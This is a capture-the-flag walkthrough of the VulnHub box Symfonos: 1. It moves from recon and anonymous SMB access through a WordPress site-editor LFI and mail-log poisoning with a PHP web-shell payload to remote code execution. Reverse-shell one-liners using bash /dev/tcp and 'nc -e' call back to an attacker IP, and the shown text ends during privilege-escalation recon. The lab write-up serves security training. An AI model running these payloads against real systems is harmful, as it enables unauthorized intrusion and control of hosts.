# Symfonos: 1

## Recon & Enummeration

Nmap shows us the following:
```
kali@kali:~/ctf/boxes/vulnhub/symfonos_1$ nmap -A -oA tcp-full.nmap 10.10.10.11
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 10:53 EDT
Nmap scan report for 10.10.10.11
Host is up (0.0011s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```


### SMB

SMB seems to be open, and to contain a world readable file `attention.txt`

```
kali@kali:~/ctf/boxes/vulnhub/symfonos_1$ smbmap -H 10.10.10.11 -R
[+] Guest session   	IP: 10.10.10.11:445	Name: 10.10.10.11                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	helios                                            	NO ACCESS	Helios personal share
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Fri Jun 28 21:14:49 2019	.
	dr--r--r--                0 Fri Jun 28 21:12:15 2019	..
	fr--r--r--              154 Fri Jun 28 21:14:49 2019	attention.txt
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```
The file contains the following message:
```
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```
Samba SMBd 4.5.16 doesn't seem to have any known exploits in exploitdb.

After looking further I saw I missed another share: Helios.

We are able to login to the helios share using "qwerty" as password:
```
kali@kali:~/ctf/boxes/vulnhub/symfonos_1$ smbclient \\\\10.10.10.11\\helios -U helios
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Fri Jun 28 20:37:04 2019
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

		19994224 blocks of size 1024. 17284172 blocks available
```

Research.txt contains some methology stuff:
```
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```

Todo.txt contains a potentially useful share or username:
```
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```



### SMTP

We can use SMTP user enumeration to verify the user `zeus` doesn't exist on the machine using `smtp-user-enum -M VRFY -u "zeus" -t 10.10.10.11`

Also, the server is not vulnerable to any of the following CVE's: ` nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.11`

### Port 80

The website shows a single image, depicting a painting. I didn't check the image for any stegnography or other embedded information.

A Gobuster (`gobuster dir --url 10.10.10.11 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`) didn't give us any interesting information.

However, the information deduced from the SMB shares makes us stumble op on a Wordpress site: http://10.10.10.11/h3l105/

We need to add `symfonos.local` to our `/etc/hosts` in order to get the page to fully load.


## Intitial Foothold


The wordpress page has directory listing on at URL `http://10.10.10.11/h3l105/wp-content/uploads/`

We can find a directory `siteeditor` which seems to belong to a plugin called site-editor. It is vulnerable to LFI:
`http://10.10.10.11/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

Which shows us there is a `helios` user on the system.

### LFI to RCE with mail log poisoning

First we note we can read the mail of user helios:

`http://10.10.10.11/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios`

As we can access the mail of user helios, we can send an email to him containing php code:

```
kali@kali:~/ctf/boxes/vulnhub/symfonos_1$ telnet 10.10.10.11 25
Trying 10.10.10.11...
Connected to 10.10.10.11.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
helo ok
250 symfonos.localdomain
mail from: bla@bla.com
250 2.1.0 Ok
rcpt to: helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
bahlsdf
..
.
250 2.0.0 Ok: queued as 0F69740698
quit
221 2.0.0 Bye
Connection closed by foreign host.

```
We can verify we have an RCE as user `helios`:

`http://10.10.10.11/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=id`


Now we want a persistent connection, so we try to pop a reverse shell:

```
kali@kali:~/ctf/boxes/vulnhub/symfonos_1$ telnet 10.10.10.11 25
Trying 10.10.10.11...
Connected to 10.10.10.11.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
helo ok
250 symfonos.localdomain
mail from: test@test.comm
250 2.1.0 Ok
rcpt to: helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system("bash -i >& /dev/tcp/10.10.10.4/4242 0>&1"); ?>                                                 
bahlsdfffff
.
250 2.0.0 Ok: queued as CE61240698
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

This fails. So we try to pass something else as a parameter:
`http://10.10.10.11/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=nc -e /bin/sh 10.10.10.4 4242`

Which does return a shell, possibly because of the absence of bash or a problem with encoding.

After we upgrade our shell to a python pty pseudo shell we verify we run as "helios":
```
helios@symfonos:/$ id
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Privilege Escalation

```
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$B8GkoAZZA6.9fooDdaL05B0sazTW0P/ | admin         | helios@blah.com |          | 2019-06-29 00:46:01 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

linpeas:

```
-rwsr-xr-x 1 root root       8.5K Jun 28  2019 /opt/statuscheck
  --- It looks like /opt/statuscheck is executing curl and you can impersonate it (strings line: curl -I H) (https://tinyurl.com/suidpath)
```


```
helios@symfonos:/opt$ ./statuscheck 
HTTP/1.1 200 OK
Date: Sun, 30 May 2021 19:31:23 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html
```

